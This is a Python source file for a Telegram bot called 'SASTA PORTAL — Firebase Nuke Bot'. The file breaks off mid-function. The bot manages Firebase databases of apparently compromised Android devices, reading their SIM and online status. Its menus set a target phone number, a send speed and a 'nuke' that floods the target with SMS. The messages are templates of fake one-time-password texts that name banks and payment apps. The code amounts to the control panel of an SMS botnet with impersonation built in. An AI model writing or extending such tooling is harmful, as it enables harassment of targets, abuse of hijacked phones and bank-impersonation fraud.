import asyncio
import json
import logging
import os
import random
import re
import time
from datetime import datetime
from functools import wraps
from pathlib import Path
from typing import Dict, List, Optional
from collections import defaultdict

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

from keep_alive import keep_alive

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "6761752864"))

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN not set!")

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("SASTA_PORTAL")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("werkzeug").setLevel(logging.WARNING)


# ═══════════════════════════════════════════════════════════
# TRUSTED USERS STORAGE
# ═══════════════════════════════════════════════════════════

TRUSTED_FILE = Path("trusted.json")


def load_trusted() -> Dict[str, dict]:
    try:
        if TRUSTED_FILE.exists():
            with open(TRUSTED_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    return data
    except Exception as e:
        logger.error(f"Failed to load trusted.json: {e}")
    return {}


def save_trusted(trusted: Dict[str, dict]):
    try:
        with open(TRUSTED_FILE, "w", encoding="utf-8") as f:
            json.dump(trusted, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Failed to save trusted.json: {e}")


def is_trusted(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    return str(user_id) in load_trusted()


def add_trusted(user_id: int, name: str = "Unknown", added_by: int = 0) -> bool:
    trusted = load_trusted()
    key = str(user_id)
    if key in trusted:
        return False
    trusted[key] = {
        "name": name,
        "added_at": datetime.now().isoformat(),
        "added_by": added_by,
    }
    save_trusted(trusted)
    return True


def remove_trusted(user_id: int) -> bool:
    trusted = load_trusted()
    key = str(user_id)
    if key in trusted:
        del trusted[key]
        save_trusted(trusted)
        return True
    return False


# ═══════════════════════════════════════════════════════════
# GLOBAL STATE
# ═══════════════════════════════════════════════════════════

user_sessions: Dict[int, "UserSession"] = {}
_start_time = time.time()


# ═══════════════════════════════════════════════════════════
# DATA CLASSES
# ═══════════════════════════════════════════════════════════

class FirebaseConfig:
    def __init__(self, name: str, url: str, key: str):
        self.name = name
        self.url = url.rstrip("/")
        self.key = key
        self.devices: List[dict] = []
        self.unique_devices: Dict[str, dict] = {}
        self.online_count = 0
        self.offline_count = 0
        self.unique_online = 0
        self.unique_offline = 0
        self.created_at = datetime.now()


class UserSession:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.firebase_configs: Dict[str, FirebaseConfig] = {}
        self.active_config: Optional[str] = None
        self.target_number: Optional[str] = None
        self.message_mode = "random"
        self.custom_message: Optional[str] = None
        self.custom_messages: List[str] = []
        self.custom_message_count = 0
        self.custom_message_index = 0
        self.one_shot = False
        self.is_nuking = False
        self.nuke_stats = {"sent": 0, "failed": 0}
        self.sms_limit = 0
        self.max_sms_capacity = 0
        self.pending_devices: List = []
        self.nuke_speed = 2.0
        self.nuke_speed_label = "🚶 Normal"
        self.step = "start"
        self.temp_config: Dict = {}
        self.selected_configs: List[str] = []
        self.configs_to_delete: List[str] = []
        self.last_activity = datetime.now()


# ═══════════════════════════════════════════════════════════
# SECURITY DECORATORS
# ═══════════════════════════════════════════════════════════

def authorized_only(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user = update.effective_user
        if not user:
            return
        if not is_trusted(user.id):
            logger.warning(f"⛔ Unauthorized: {user.id} ({user.username})")
            try:
                if update.message:
                    await update.message.reply_text(
                        "🚫 *Unauthorized*\n\n"
                        f"Your Chat ID: `{user.id}`\n\n"
                        "This bot is private. Ask the admin to add you.",
                        parse_mode="Markdown",
                    )
                elif update.callback_query:
                    await update.callback_query.answer(
                        "🚫 Unauthorized — private bot", show_alert=True
                    )
            except Exception:
                pass
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


def rate_limit(max_per_min: int = 120):
    hits: Dict[int, List[float]] = defaultdict(list)

    def decorator(func):
        @wraps(func)
        async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
            uid = update.effective_user.id if update.effective_user else 0
            now = time.time()
            hits[uid] = [t for t in hits[uid] if now - t < 60]
            if len(hits[uid]) >= max_per_min:
                if update.callback_query:
                    await update.callback_query.answer(
                        "⚠️ Too many requests. Slow down!", show_alert=True
                    )
                return
            hits[uid].append(now)
            return await func(update, context, *args, **kwargs)
        return wrapper
    return decorator


# ═══════════════════════════════════════════════════════════
# FIREBASE HELPERS
# ═══════════════════════════════════════════════════════════

def _norm_url(url: str) -> str:
    url = url.strip().rstrip("/")
    if not url.startswith("http"):
        url = "https://" + url
    return url


async def fb_get(base_url: str, key: str, path: str) -> Optional[dict]:
    url = f"{_norm_url(base_url)}/{path}.json?auth={key}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, headers={"Accept": "application/json"}) as r:
                if r.status == 200:
                    return await r.json()
                if r.status == 404:
                    return None
                if r.status in (401, 403):
                    raise PermissionError("PERMISSION_DENIED")
                raise RuntimeError(f"HTTP {r.status}")
    except asyncio.TimeoutError:
        raise RuntimeError("Request timed out")
    except aiohttp.ClientError as e:
        raise RuntimeError(f"Network error: {e}")


async def fb_set(base_url: str, key: str, path: str, data: dict) -> bool:
    url = f"{_norm_url(base_url)}/{path}.json?auth={key}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.put(
                url, json=data, headers={"Content-Type": "application/json"}
            ) as r:
                return r.status == 200
    except Exception as e:
        logger.error(f"fb_set error: {e}")
        return False


async def fetch_devices(config: FirebaseConfig):
    data = await fb_get(config.url, config.key, "clients")
    devices = []
    if isinstance(data, dict):
        for did, dd in data.items():
            if isinstance(dd, dict):
                dd["id"] = did
                devices.append(dd)
    config.devices = devices
    unique = {}
    for d in devices:
        did = d.get("id")
        if not did:
            continue
        if did in unique:
            ex = unique[did]
            for k, v in d.items():
                if v and not ex.get(k):
                    ex[k] = v
            ex["status"] = ex.get("status", False) or d.get("status", False)
        else:
            unique[did] = d
    config.unique_devices = unique
    config.online_count = sum(1 for d in devices if d.get("status", False))
    config.offline_count = len(devices) - config.online_count
    config.unique_online = sum(1 for d in unique.values() if d.get("status", False))
    config.unique_offline = len(unique) - config.unique_online


# ═══════════════════════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════════════════════

def kb_main(user_id: int = 0):
    rows = [
        [InlineKeyboardButton("🔥 Add Firebase Config", callback_data="add_firebase")],
        [InlineKeyboardButton("📋 Manage Firebase Configs", callback_data="manage_configs")],
        [InlineKeyboardButton("📊 Firebase Count", callback_data="firebase_count")],
        [InlineKeyboardButton("🗑 Delete Firebase Configs", callback_data="delete_configs_menu")],
        [InlineKeyboardButton("📊 View Device Stats", callback_data="view_stats")],
        [InlineKeyboardButton("🎯 Set Target Number", callback_data="set_target")],
        [InlineKeyboardButton("💬 Set Message Mode", callback_data="set_mode")],
        [InlineKeyboardButton("⚡ Set Speed", callback_data="set_speed")],
        [InlineKeyboardButton("🚀 Start Nuke", callback_data="start_nuke")],
        [InlineKeyboardButton("⏹ Stop Nuke", callback_data="stop_nuke")],
        [InlineKeyboardButton("📊 Check Status", callback_data="check_status")],
        [InlineKeyboardButton("🔍 View Online Devices", callback_data="view_devices")],
    ]
    if user_id == ADMIN_ID:
        rows.append([InlineKeyboardButton("👥 Trusted Users", callback_data="trusted_menu")])
    return InlineKeyboardMarkup(rows)


def kb_cancel():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])


def kb_mode():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎲 Random OTP", callback_data="mode_random")],
        [InlineKeyboardButton("✏️ Single Custom (one-shot)", callback_data="mode_custom_single")],
        [InlineKeyboardButton("📝 Multiple Custom (one-shot)", callback_data="mode_custom_multi")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ])


def kb_speed():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🐢 Slow — 5s", callback_data="speed_slow")],
        [InlineKeyboardButton("🚶 Normal — 2s", callback_data="speed_normal")],
        [InlineKeyboardButton("🏃 Fast — 1s", callback_data="speed_fast")],
        [InlineKeyboardButton("⚡ Turbo — 0.3s", callback_data="speed_turbo")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ])


def kb_delete_mode():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🗑 Delete Single", callback_data="delete_single")],
        [InlineKeyboardButton("🗑🗑 Delete Multiple", callback_data="delete_multiple")],
        [InlineKeyboardButton("🗑🗑🗑 Delete All", callback_data="delete_all")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ])


def kb_mcount():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("1", callback_data="mcount_1"),
            InlineKeyboardButton("2", callback_data="mcount_2"),
            InlineKeyboardButton("3", callback_data="mcount_3"),
            InlineKeyboardButton("4", callback_data="mcount_4"),
            InlineKeyboardButton("5", callback_data="mcount_5"),
        ],
        [
            InlineKeyboardButton("6", callback_data="mcount_6"),
            InlineKeyboardButton("7", callback_data="mcount_7"),
            InlineKeyboardButton("8", callback_data="mcount_8"),
            InlineKeyboardButton("9", callback_data="mcount_9"),
            InlineKeyboardButton("10", callback_data="mcount_10"),
        ],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
    ])


def kb_configs_manage(configs):
    rows = []
    for name, c in configs.items():
        rows.append([InlineKeyboardButton(
            f"📱 {name} (🟢{c.unique_online} 🔴{c.unique_offline})",
            callback_data=f"view_config_{name}",
        )])
    rows.append([InlineKeyboardButton("➕ Add New", callback_data="add_firebase")])
    rows.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)


def kb_config_actions(name):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh_config_{name}")],
        [InlineKeyboardButton("📱 View Devices", callback_data=f"view_devices_config_{name}")],
        [InlineKeyboardButton("🗑 Delete", callback_data=f"delete_config_{name}")],
        [InlineKeyboardButton("🔙 Back", callback_data="manage_configs")],
    ])


def kb_config_multi_select(configs, selected, action):
    rows = []
    for name, c in configs.items():
        mark = "✅" if name in selected else "⬜"
        rows.append([InlineKeyboardButton(
            f"{mark} {name} (🟢{c.unique_online} 🔴{c.unique_offline})",
            callback_data=f"toggle_{action}_{name}",
        )])
    if action == "nuke":
        rows.append([InlineKeyboardButton("✅ Confirm", callback_data="confirm_configs")])
    else:
        rows.append([InlineKeyboardButton("🗑 Delete Selected", callback_data="confirm_delete_configs")])
    rows.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)


def kb_trusted_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Trusted User", callback_data="trusted_add")],
        [InlineKeyboardButton("📋 List Trusted Users", callback_data="trusted_list")],
        [InlineKeyboardButton("➖ Remove Trusted User", callback_data="trusted_remove")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ])


def kb_trusted_list(trusted: Dict[str, dict]):
    rows = []
    if not trusted:
        rows.append([InlineKeyboardButton("(empty)", callback_data="noop")])
    else:
        for uid, info in trusted.items():
            name = info.get("name", "Unknown")
            rows.append([InlineKeyboardButton(
                f"➖ {name} ({uid})",
                callback_data=f"trusted_remove_{uid}",
            )])
    rows.append([InlineKeyboardButton("➕ Add Trusted", callback_data="trusted_add")])
    rows.append([InlineKeyboardButton("🔙 Back", callback_data="trusted_menu")])
    return InlineKeyboardMarkup(rows)


# ═══════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════

APP_NAMES = ["Google", "Amazon", "PayPal", "HDFC", "SBI", "ICICI",
             "Gmail", "Microsoft", "Paytm", "Netflix", "PhonePe", "CRED"]

TEMPLATES = [
    "Your OTP is {OTP} for {APP}. Never share this with anyone.",
    "{APP}: Use {OTP} as your OTP to complete the transaction.",
    "Your verification code is {OTP}. Please do not share.",
    "OTP {OTP} for {APP}. Valid for 5 minutes.",
    "Use OTP {OTP} to verify your {APP} account.",
    "Don't share this OTP. Your {APP} code is {OTP}.",
    "One-Time Password: {OTP} for {APP}.",
    "Complete your login with OTP: {OTP}. {APP}.",
]


def apply_placeholders(text: str) -> str:
    if not text:
        return ""
    return (
        text.replace("{APP}", random.choice(APP_NAMES))
            .replace("{OTP}", str(random.randint(100000, 999999)))
            .replace("{ID}", "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)))
    )


def build_random_msg() -> str:
    tpl = random.choice(TEMPLATES)
    return tpl.replace("{APP}", random.choice(APP_NAMES)).replace(
        "{OTP}", str(random.randint(100000, 999999))
    )


def human_time(sec: int) -> str:
    if sec < 60:
        return f"{sec}s"
    m, s = divmod(sec, 60)
    if m < 60:
        return f"{m}m {s}s"
    h, m = divmod(m, 60)
    return f"{h}h {m}m"


def get_device_sims(device: dict) -> List[int]:
    sims = device.get("sims", []) or []
    if isinstance(sims, dict):
        sims = list(sims.values())
    slots = []
    for i, sim in enumerate(sims):
        if not isinstance(sim, dict):
            continue
        if sim.get("phoneNumber") or sim.get("carrierName"):
            idx = sim.get("simSlotIndex", i)
            slots.append(int(idx) + 1)
    if not slots:
        slots = [1]
    return list(set(slots))


# ═══════════════════════════════════════════════════════════
# COMMANDS
# ═══════════════════════════════════════════════════════════

@authorized_only
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_sessions.setdefault(uid, UserSession(uid))
    role = "👑 Admin" if uid == ADMIN_ID else "⭐ Trusted User"
    await update.message.reply_text(
        f"🔥 *SASTA PORTAL — Firebase Nuke Bot*\n\n"
        f"{role}\n"
        f"🆔 Your ID: `{uid}`\n\n"
        "⚠️ *Bulk SMS tool. Use only with authorization.*\n\n"
        "Use the buttons below:",
        reply_markup=kb_main(uid),
        parse_mode="Markdown",
    )


@authorized_only
async def cmd_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(
        f"🆔 *Your Chat ID:* `{uid}`\n\n"
        "Share this with the admin to get access.",
        parse_mode="Markdown",
    )


@authorized_only
async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    up = int(time.time() - _start_time)
    trusted = load_trusted()
    await update.message.reply_text(
        f"✅ *Bot Status*\n\n"
        f"🕐 Uptime: `{human_time(up)}`\n"
        f"👑 Admin: `{ADMIN_ID}`\n"
        f"👥 Trusted: `{len(trusted)}`\n"
        f"💬 Sessions: `{len(user_sessions)}`",
        parse_mode="Markdown",
    )


# ═══════════════════════════════════════════════════════════
# CALLBACK HANDLER
# ═══════════════════════════════════════════════════════════

@authorized_only
@rate_limit(120)
async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = update.effective_user.id
    s = user_sessions.setdefault(uid, UserSession(uid))
    s.last_activity = datetime.now()
    d = q.data

    if d == "noop":
        return

    if d == "back_main":
        await q.edit_message_text("🔙 *Main Menu*", reply_markup=kb_main(uid), parse_mode="Markdown")
        return

    if d == "cancel":
        s.step = "start"
        s.temp_config = {}
        s.configs_to_delete = []
        s.custom_messages = []
        s.custom_message_count = 0
        await q.edit_message_text("❌ *Cancelled*", reply_markup=kb_main(uid), parse_mode="Markdown")
        return

    # ═══════════════════════════════════════════════
    # TRUSTED USERS (admin only)
    # ═══════════════════════════════════════════════
    if d == "trusted_menu":
        if uid != ADMIN_ID:
            await q.answer("Admin only", show_alert=True)
            return
        trusted = load_trusted()
        await q.edit_message_text(
            f"👥 *Trusted Users*\n\n"
            f"Total: `{len(trusted)}`\n\n"
            f"Only YOU can add/remove.",
            reply_markup=kb_trusted_menu(),
            parse_mode="Markdown",
        )
        return

    if d == "trusted_add":
        if uid != ADMIN_ID:
            await q.answer("Admin only", show_alert=True)
            return
        s.step = "trusted_add_id"
        await q.edit_message_text(
            "➕ *Add Trusted User*\n\n"
            "Send the **Chat ID** of the user.\n\n"
            "💡 Ask them to send `/id` to the bot first.\n\n"
            "Or `ID Name` for a name: `6761752864 John`",
            reply_markup=kb_cancel(),
            parse_mode="Markdown",
        )
        return

    if d == "trusted_list":
        if uid != ADMIN_ID:
            await q.answer("Admin only", show_alert=True)
            return
        trusted = load_trusted()
        if not trusted:
            await q.edit_message_text(
                "📋 *No trusted users yet.*",
                reply_markup=kb_trusted_menu(),
                parse_mode="Markdown",
            )
            return
        lines = []
        for i, (tu_id, info) in enumerate(trusted.items(), 1):
            name = info.get("name", "Unknown")
            added = info.get("added_at", "")[:10]
            lines.append(f"{i}. 👤 `{name}`\n   🆔 `{tu_id}`\n   📅 {added}")
        await q.edit_message_text(
            f"📋 *Trusted Users ({len(trusted)})*\n\n" + "\n\n".join(lines),
            reply_markup=kb_trusted_list(trusted),
            parse_mode="Markdown",
        )
        return

    if d == "trusted_remove":
        if uid != ADMIN_ID:
            await q.answer("Admin only", show_alert=True)
            return
        trusted = load_trusted()
        await q.edit_message_text(
            "➖ *Remove Trusted User*\n\nTap a user:",
            reply_markup=kb_trusted_list(trusted),
            parse_mode="Markdown",
        )
        return

    if d.startswith("trusted_remove_"):
        if uid != ADMIN_ID:
            await q.answer("Admin only", show_alert=True)
            return
        target_id = d.replace("trusted_remove_", "")
        trusted = load_trusted()
        if target_id not in trusted:
            await q.answer("Not found", show_alert=True)
            return
        name = trusted[target_id].get("name", "Unknown")
        await q.edit_message_text(
            f"⚠️ *Remove Trusted User?*\n\n"
            f"👤 `{name}`\n"
            f"🆔 `{target_id}`",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Yes", callback_data=f"trusted_remove_confirm_{target_id}")],
                [InlineKeyboardButton("❌ Cancel", callback_data="trusted_list")],
            ]),
            parse_mode="Markdown",
        )
        return

    if d.startswith("trusted_remove_confirm_"):
        if uid != ADMIN_ID:
            await q.answer("Admin only", show_alert=True)
            return
        target_id = d.replace("trusted_remove_confirm_", "")
        if remove_trusted(int(target_id)):
            try:
                await context.bot.send_message(
                    chat_id=int(target_id),
                    text="🚫 *Access Revoked*\n\nYou have been removed.",
                    parse_mode="Markdown",
                )
            except Exception:
                pass
            await q.edit_message_text(
                f"✅ Removed `{target_id}`.",
                reply_markup=kb_trusted_menu(),
                parse_mode="Markdown",
            )
        else:
            await q.answer("Not found", show_alert=True)
        return

    # ═══════════════════════════════════════════════
    # FIREBASE
    # ═══════════════════════════════════════════════
    if d == "add_firebase":
        s.step = "fb_name"
        s.temp_config = {}
        await q.edit_message_text(
            "🔥 *Add Firebase*\n\n*Step 1/3:* Enter a name (e.g. `Production`)",
            reply_markup=kb_cancel(),
            parse_mode="Markdown",
        )
        return

    if d == "manage_configs":
        if not s.firebase_configs:
            await q.edit_message_text("📋 *No Configs*", reply_markup=kb_main(uid), parse_mode="Markdown")
            return
        await q.edit_message_text(
            "📋 *Manage Configs*",
            reply_markup=kb_configs_manage(s.firebase_configs),
            parse_mode="Markdown",
        )
        return

    if d == "firebase_count":
        total = len(s.firebase_configs)
        if total == 0:
            await q.edit_message_text(
                "📊 *Firebase Count*\n\n🔴 Total: `0`",
                reply_markup=kb_main(uid),
                parse_mode="Markdown",
            )
            return
        tot_dev = tot_on = tot_off = 0
        lines = []
        for i, (n, c) in enumerate(s.firebase_configs.items(), 1):
            tot_dev += len(c.unique_devices)
            tot_on += c.unique_online
            tot_off += c.unique_offline
            emoji = "🟢" if c.unique_online > 0 else "🔴"
            lines.append(f"{i}. {emoji} `{n}` — 🟢{c.unique_online} 🔴{c.unique_offline}")
        await q.edit_message_text(
            f"📊 *Firebase Count*\n\n"
            f"🔢 Total: `{total}`\n"
            f"📱 Devices: `{tot_dev}`\n"
            f"🟢 Online: `{tot_on}`\n"
            f"🔴 Offline: `{tot_off}`\n\n"
            + "\n".join(lines),
            reply_markup=kb_main(uid),
            parse_mode="Markdown",
        )
        return

    # ── DELETE ─────────────────────────────────────
    if d == "delete_configs_menu":
        if not s.firebase_configs:
            await q.edit_message_text("📋 No configs.", reply_markup=kb_main(uid), parse_mode="Markdown")
            return
        await q.edit_message_text("🗑 *Delete Configs*", reply_markup=kb_delete_mode(), parse_mode="Markdown")
        return

    if d == "delete_single":
        rows = []
        for n, c in s.firebase_configs.items():
            rows.append([InlineKeyboardButton(
                f"🗑 {n} (🟢{c.unique_online} 🔴{c.unique_offline})",
                callback_data=f"delete_single_config_{n}",
            )])
        rows.append([InlineKeyboardButton("🔙 Back", callback_data="delete_configs_menu")])
        await q.edit_message_text(
            "🗑 *Select Config*", reply_markup=InlineKeyboardMarkup(rows), parse_mode="Markdown"
        )
        return

    if d.startswith("delete_single_config_"):
        name = d.replace("delete_single_config_", "")
        if name not in s.firebase_configs:
            await q.answer("Not found", show_alert=True)
            return
        await q.edit_message_text(
            f"⚠️ Delete `{name}`?",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Delete", callback_data=f"confirm_delete_{name}")],
                [InlineKeyboardButton("❌ Cancel", callback_data="delete_configs_menu")],
            ]),
            parse_mode="Markdown",
        )
        return

    if d.startswith("confirm_delete_"):
        name = d.replace("confirm_delete_", "")
        if name in s.firebase_configs:
            del s.firebase_configs[name]
            if s.active_config == name:
                s.active_config = None
        await q.edit_message_text(
            f"🗑 `{name}` deleted.", reply_markup=kb_main(uid), parse_mode="Markdown"
        )
        return

    if d == "delete_multiple":
        s.configs_to_delete = []
        await q.edit_message_text(
            "🗑 *Select Configs*",
            reply_markup=kb_config_multi_select(s.firebase_configs, s.configs_to_delete, "delete"),
            parse_mode="Markdown",
        )
        return

    if d.startswith("toggle_delete_"):
        name = d.replace("toggle_delete_", "")
        if name in s.configs_to_delete:
            s.configs_to_delete.remove(name)
        else:
            s.configs_to_delete.append(name)
        await q.edit_message_text(
            f"🗑 Selected: `{len(s.configs_to_delete)}`",
            reply_markup=kb_config_multi_select(s.firebase_configs, s.configs_to_delete, "delete"),
            parse_mode="Markdown",
        )
        return

    if d == "confirm_delete_configs":
        if not s.configs_to_delete:
            await q.answer("None selected", show_alert=True)
            return
        cnt = 0
        for n in list(s.configs_to_delete):
            if n in s.firebase_configs:
                del s.firebase_configs[n]
                cnt += 1
                if s.active_config == n:
                    s.active_config = None
        s.configs_to_delete = []
        await q.edit_message_text(
            f"🗑 Deleted `{cnt}` configs.", reply_markup=kb_main(uid), parse_mode="Markdown"
        )
        return

    if d == "delete_all":
        await q.edit_message_text(
            f"⚠️ *Delete ALL {len(s.firebase_configs)} configs?*",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Yes", callback_data="confirm_delete_all_configs")],
                [InlineKeyboardButton("❌ Cancel", callback_data="delete_configs_menu")],
            ]),
            parse_mode="Markdown",
        )
        return

    if d == "confirm_delete_all_configs":
        s.firebase_configs.clear()
        s.active_config = None
        await q.edit_message_text("🗑 All deleted.", reply_markup=kb_main(uid), parse_mode="Markdown")
        return

    # ── VIEW CONFIG ────────────────────────────────
    if d.startswith("view_config_"):
        name = d.replace("view_config_", "")
        cfg = s.firebase_configs.get(name)
        if not cfg:
            await q.answer("Not found", show_alert=True)
            return
        await q.edit_message_text("⏳...", parse_mode="Markdown")
        try:
            await fetch_devices(cfg)
        except Exception as e:
            await q.edit_message_text(f"❌ `{e}`", reply_markup=kb_main(uid), parse_mode="Markdown")
            return
        dup = (cfg.online_count + cfg.offline_count) - len(cfg.unique_devices)
        await q.edit_message_text(
            f"📱 *Config: {name}*\n\n"
            f"🔗 `{cfg.url}`\n\n"
            f"🟢 Online: `{cfg.unique_online}`\n"
            f"🔴 Offline: `{cfg.unique_offline}`\n"
            f"📱 Unique: `{len(cfg.unique_devices)}`\n"
            f"⚠️ Duplicates: `{dup}`",
            reply_markup=kb_config_actions(name),
            parse_mode="Markdown",
        )
        return

    if d.startswith("refresh_config_"):
        name = d.replace("refresh_config_", "")
        cfg = s.firebase_configs.get(name)
        if not cfg:
            await q.answer("Not found", show_alert=True)
            return
        try:
            await fetch_devices(cfg)
            await q.edit_message_text(
                f"✅ Refreshed\n🟢 `{cfg.unique_online}` | 🔴 `{cfg.unique_offline}`",
                reply_markup=kb_main(uid),
                parse_mode="Markdown",
            )
        except Exception as e:
            await q.answer(f"Error: {e}", show_alert=True)
        return

    if d.startswith("view_devices_config_"):
        name = d.replace("view_devices_config_", "")
        cfg = s.firebase_configs.get(name)
        if not cfg:
            await q.answer("Not found", show_alert=True)
            return
        try:
            await fetch_devices(cfg)
        except Exception:
            pass
        lines = []
        for i, (did, dv) in enumerate(list(cfg.unique_devices.items())[:30], 1):
            emoji = "🟢" if dv.get("status") else "🔴"
            nm = dv.get("modelName") or dv.get("name") or "Unknown"
            lines.append(f"{i}. {emoji} `{nm[:20]}`")
        msg = (
            f"📱 *Devices in {name}*\n"
            f"🟢 {cfg.unique_online} | 🔴 {cfg.unique_offline}\n\n"
            + ("\n".join(lines) if lines else "No devices")
        )
        await q.edit_message_text(msg, reply_markup=kb_config_actions(name), parse_mode="Markdown")
        return

    if d.startswith("delete_config_"):
        name = d.replace("delete_config_", "")
        await q.edit_message_text(
            f"⚠️ Delete `{name}`?",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Yes", callback_data=f"confirm_delete_{name}")],
                [InlineKeyboardButton("❌ Cancel", callback_data="manage_configs")],
            ]),
            parse_mode="Markdown",
        )
        return

    # ── STATS ──────────────────────────────────────
    if d == "view_stats":
        if not s.firebase_configs:
            await q.answer("No configs", show_alert=True)
            return
        await q.edit_message_text("⏳...", parse_mode="Markdown")
        tot_on = tot_off = tot_dev = tot_dup = 0
        bd = []
        for n, c in s.firebase_configs.items():
            try:
                await fetch_devices(c)
            except Exception:
                pass
            tot_on += c.unique_online
            tot_off += c.unique_offline
            tot_dev += len(c.unique_devices)
            tot_dup += (c.online_count + c.offline_count) - len(c.unique_devices)
            bd.append(f"📱 `{n}` — 🟢 {c.unique_online} | 🔴 {c.unique_offline}")
        await q.edit_message_text(
            f"📊 *Overall Stats*\n\n"
            f"📁 Configs: `{len(s.firebase_configs)}`\n"
            f"📱 Devices: `{tot_dev}`\n"
            f"🟢 Online: `{tot_on}`\n"
            f"🔴 Offline: `{tot_off}`\n"
            f"⚠️ Duplicates: `{tot_dup}`\n\n"
            + "\n".join(bd),
            reply_markup=kb_main(uid),
            parse_mode="Markdown",
        )
        return

    if d == "view_devices":
        if not s.firebase_configs:
            await q.answer("No configs", show_alert=True)
            return
        await q.edit_message_text("⏳...", parse_mode="Markdown")
        lines = []
        cnt = 0
        for n, c in s.firebase_configs.items():
            try:
                await fetch_devices(c)
            except Exception:
                continue
            for did, dv in c.unique_devices.items():
                if dv.get("status"):
                    cnt += 1
                    nm = dv.get("modelName") or dv.get("name") or "Unknown"
                    lines.append(f"🟢 `{nm[:20]}` ({n})")
        msg = f"🔍 *Online ({cnt})*\n\n" + ("\n".join(lines[:30]) if lines else "None")
        await q.edit_message_text(msg, reply_markup=kb_main(uid), parse_mode="Markdown")
        return

    # ── TARGET ─────────────────────────────────────
    if d == "set_target":
        s.step = "target"
        await q.edit_message_text(
            "🎯 *Set Target*\n\nExample: `+919876543210`",
            reply_markup=kb_cancel(),
            parse_mode="Markdown",
        )
        return

    # ── MODE ───────────────────────────────────────
    if d == "set_mode":
        await q.edit_message_text(
            f"💬 *Mode*\n\nCurrent: `{s.message_mode}`",
            reply_markup=kb_mode(),
            parse_mode="Markdown",
        )
        return

    if d == "mode_random":
        s.message_mode = "random"
        s.one_shot = False
        s.custom_messages = []
        await q.edit_message_text("✅ *Random OTP Mode*", reply_markup=kb_main(uid), parse_mode="Markdown")
        return

    if d == "mode_custom_single":
        s.message_mode = "custom_single"
        s.one_shot = True
        s.step = "custom_single_msg"
        await q.edit_message_text(
            "✏️ *Single Custom*\n\n"
            "⚠️ Sends ONE SMS per device — ONCE.\n\n"
            "Placeholders: `{APP}` `{OTP}` `{ID}`",
            reply_markup=kb_cancel(),
            parse_mode="Markdown",
        )
        return

    if d == "mode_custom_multi":
        s.message_mode = "custom_multi"
        s.one_shot = True
        s.custom_messages = []
        s.custom_message_count = 0
        s.custom_message_index = 0
        await q.edit_message_text(
            "📝 *Multiple Custom*\n\nHow many different messages?",
            reply_markup=kb_mcount(),
            parse_mode="Markdown",
        )
        return

    if d.startswith("mcount_"):
        cnt = int(d.replace("mcount_", ""))
        s.custom_message_count = cnt
        s.custom_messages = []
        s.custom_message_index = 0
        s.step = "custom_multi_msg"
        await q.edit_message_text(
            f"📝 *Adding {cnt}*\n\nSend message 1 of {cnt}:",
            reply_markup=kb_cancel(),
            parse_mode="Markdown",
        )
        return

    # ── SPEED ──────────────────────────────────────
    if d == "set_speed":
        await q.edit_message_text(
            f"⚡ *Speed*\n\nCurrent: `{s.nuke_speed_label}`",
            reply_markup=kb_speed(),
            parse_mode="Markdown",
        )
        return

    if d.startswith("speed_"):
        key = d.replace("speed_", "")
        table = {
            "slow":   (5.0, "🐢 Slow"),
            "normal": (2.0, "🚶 Normal"),
            "fast":   (1.0, "🏃 Fast"),
            "turbo":  (0.3, "⚡ Turbo"),
        }
        if key not in table:
            await q.answer("Invalid", show_alert=True)
            return
        s.nuke_speed, s.nuke_speed_label = table[key]
        await q.edit_message_text(
